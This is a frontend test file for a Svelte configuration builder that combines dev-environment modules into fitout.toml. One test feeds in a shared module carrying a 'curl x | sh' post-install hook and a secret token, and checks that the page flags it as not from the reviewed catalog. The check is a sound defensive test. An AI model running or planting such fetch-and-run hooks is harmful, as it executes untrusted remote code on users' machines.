import { flushSync, mount, unmount } from 'svelte';
import { afterEach, beforeEach, expect, it } from 'vitest';
import { catalog } from '#lib/catalog.js';
import { encodeModule } from '#lib/share.js';
import Page from './+page.svelte';

let page: ReturnType<typeof mount> | null = null;

beforeEach(() => {
	// jsdom has no modal dialogs
	HTMLDialogElement.prototype.showModal = function () {
		this.open = true;
	};
	HTMLDialogElement.prototype.close = function () {
		this.open = false;
	};
	history.replaceState(null, '', '/');
});

afterEach(() => {
	if (page) unmount(page);
	page = null;
	document.body.innerHTML = '';
});

async function settle() {
	for (let i = 0; i < 20; i++) {
		await new Promise((r) => setTimeout(r, 10));
		flushSync();
	}
}

const card = (name: string) =>
	[...document.querySelectorAll('.card')].find((c) => c.querySelector('.name')?.textContent === name) as HTMLElement;
const tab = (name: string) =>
	[...document.querySelectorAll<HTMLButtonElement>('[role=tab]')].find((b) => b.textContent === name) as HTMLButtonElement;
const shown = () => document.querySelector('aside pre')?.textContent ?? '';

it('picks modules, resolves what they need and writes fitout.toml', async () => {
	page = mount(Page, { target: document.body });
	await settle();
	expect(document.querySelectorAll('.card').length).toBe(catalog.size);

	card('claude-remote').querySelector('input')?.click();
	await settle();
	expect(card('claude').textContent).toContain('needed by claude-remote');
	expect(card('claude').querySelector('input')?.disabled).toBe(true);

	tab('fitout.toml').click();
	flushSync();
	expect(shown()).toContain('modules = ["claude-remote"]');
	expect(shown()).toContain('# required by these, so enabled too: node, ssh, git, claude');
	expect(location.hash).toMatch(/^#config=/);

	// settings by type: claude-remote has choices
	expect(document.querySelector('#var-CLAUDE_REMOTE_SPAWN')?.tagName).toBe('SELECT');
});

it('edits a custom module and keeps it in the output', async () => {
	page = mount(Page, { target: document.body });
	await settle();
	[...document.querySelectorAll<HTMLButtonElement>('button')].find((b) => b.textContent === 'New custom module')?.click();
	await settle();
	const name = document.querySelector<HTMLInputElement>('#module-custom-1-name');
	expect(name).not.toBeNull();
	if (!name) return;
	name.value = 'java';
	name.dispatchEvent(new Event('input', { bubbles: true }));
	await settle();
	const desc = document.querySelector<HTMLInputElement>('#module-java-desc');
	if (!desc) throw new Error('no description field');
	desc.value = 'Java 21';
	desc.dispatchEvent(new Event('input', { bubbles: true }));
	await settle();
	tab('modules/java.toml').click();
	flushSync();
	expect(shown()).toContain('name = "java"');
	expect(shown()).toContain('description = "Java 21"');
	tab('fitout.toml').click();
	flushSync();
	expect(shown()).toContain('modules = ["java"]');
});

it('shows a module from a link before adding it', async () => {
	const doc = {
		format: 1,
		name: 'evil',
		description: 'Looks harmless',
		env: { EVIL_TOKEN: { type: 'secret' } },
		mise: { bootstrap: { hooks: { 'post-packages': { run: 'curl x | sh' } } } }
	};
	history.replaceState(null, '', `/#${encodeModule(doc)}`);
	page = mount(Page, { target: document.body });
	await settle();
	const dialog = [...document.querySelectorAll('dialog')].find((d) => d.open);
	expect(dialog?.textContent).toContain('not from the reviewed catalog');
	expect(dialog?.textContent).toContain('curl x | sh');
	expect(dialog?.textContent).toContain('EVIL_TOKEN');
	[...(dialog?.querySelectorAll<HTMLButtonElement>('button') ?? [])].find((b) => b.textContent?.includes('Add as custom module'))?.click();
	await settle();
	expect(document.querySelector<HTMLInputElement>('#module-evil-name')?.value).toBe('evil');
	expect(location.hash).toMatch(/^#config=/);
});

it('loads fitout.toml', async () => {
	page = mount(Page, { target: document.body });
	await settle();
	[...document.querySelectorAll<HTMLButtonElement>('button')].find((b) => b.textContent === 'Load files')?.click();
	const textarea = document.querySelector<HTMLTextAreaElement>('dialog textarea');
	if (!textarea) throw new Error('no import field');
	textarea.value = 'format = 1\nmodules = ["claude", "gh"]\n[env]\nCLAUDE_CONFIG_DIR = "/x"\n';
	textarea.dispatchEvent(new Event('input', { bubbles: true }));
	textarea.closest('form')?.requestSubmit();
	await settle();

	// node comes along with claude
	expect(card('node').textContent).toContain('needed by claude');
	tab('fitout.toml').click();
	flushSync();
	expect(shown()).toContain('modules = ["claude", "gh"]');
	expect(shown()).toContain('CLAUDE_CONFIG_DIR = "/x"');
});
